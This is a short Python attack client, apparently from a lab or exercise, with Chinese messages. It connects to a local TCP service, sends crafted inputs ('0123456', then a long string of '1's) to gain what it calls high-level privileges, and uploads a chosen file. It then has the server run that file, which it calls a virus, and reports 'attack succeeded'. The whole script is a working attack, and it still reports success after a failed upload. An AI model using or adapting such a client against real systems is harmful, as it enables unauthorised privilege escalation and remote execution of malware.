import socket
import os

host = "127.0.0.1"
port = 23333
buffer_size = 1024

def main() -> bool:
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((host, port))
    conn.send(b"0123456", 0)
    message = conn.recv(buffer_size, 0).decode("utf-8")
    if message != "success":
        return False
    conn.send(b"111111111111111111111111111111111111", 0)
    message = conn.recv(buffer_size, 0).decode("utf-8")
    if message != "success":
        return False
    print("已经获得高级别权限")
    file_path = input("输入要上传的文件路径: ")
    file_name = os.path.basename(file_path)
    if not os.path.isfile(file_path):
        print("文件不存在")
        return False
    with open(file_path, "rb") as f:
        content = f.read()
    message = b"f" + file_name.encode("utf-8") + b"\r\n" + content
    conn.send(message, 0)
    message = conn.recv(buffer_size, 0).decode("utf-8")
    if message != "success":
        print("文件上传失败")
    print("文件上传成功")
    run = input("是否执行病毒（0/1）: ").strip()
    if run == "1":
        conn.send(f"r{file_name}".encode("utf-8"), 0)
        message = conn.recv(buffer_size, 0).decode("utf-8")
        if message != "success":
            print("执行失败")
            return False
        print("执行成功")
    conn.close()
    return True


if __name__ == "__main__":
    if main():
        print("攻击成功")
    else:
        print("攻击失败")    

